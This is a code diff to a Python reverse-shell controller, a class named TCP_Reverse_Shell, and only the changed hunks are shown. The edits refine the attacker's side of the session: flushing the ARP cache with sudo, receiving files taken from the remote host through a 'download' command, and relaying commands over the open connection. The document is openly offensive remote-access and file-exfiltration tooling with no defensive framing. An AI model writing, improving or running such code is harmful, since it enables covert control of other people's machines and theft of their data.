@@ -3,7 +3,7 @@
 import argparse
 import socket
 import os
-
+import subprocess
 
 class TCP_Reverse_Shell:
 	def __init__(self, local, port):
@@ -23,7 +23,8 @@ class TCP_Reverse_Shell:
 
 
 	def flush_arp_cache(self):
-		os.popen("sudo ip -s -s neigh flush all")
+		print("Flushing arp cache...")
+		os.system("sudo ip -s -s neigh flush all")
 
 
 	def set_host_ip(self):
@@ -55,14 +56,12 @@ class TCP_Reverse_Shell:
 		FILE = open(self.filename, "wb")
 		while True:
 			data = self.conn.recv(1024)
-			if "DONE" in data.decode():
-				data = data.decode().replace("DONE", "")
-				data = data.encode()
-				FILE.write(data)
+			if data.endswith("DONE".encode()):
+				FILE.write(data[:-4])
 				print("[+] Transfer completed.")
 				FILE.close()
 				break
-			elif "Unable to retrieve" in data.decode():
+			elif "Unable to retrieve".encode() in data:
 				print("[-] Unable to retrieve {}".format(self.filename))
 				break
 			else:
@@ -92,7 +91,6 @@ class TCP_Reverse_Shell:
 				self.terminate_session()
 			elif not self.command.strip():
 				print("Enter a command...")
-				self.conn.send(" ".encode("utf-8"))
 			elif "download" in self.command:
 				self.conn.send(self.command.encode("utf-8"))
 				self.filename = self.command.replace("download", "").strip()
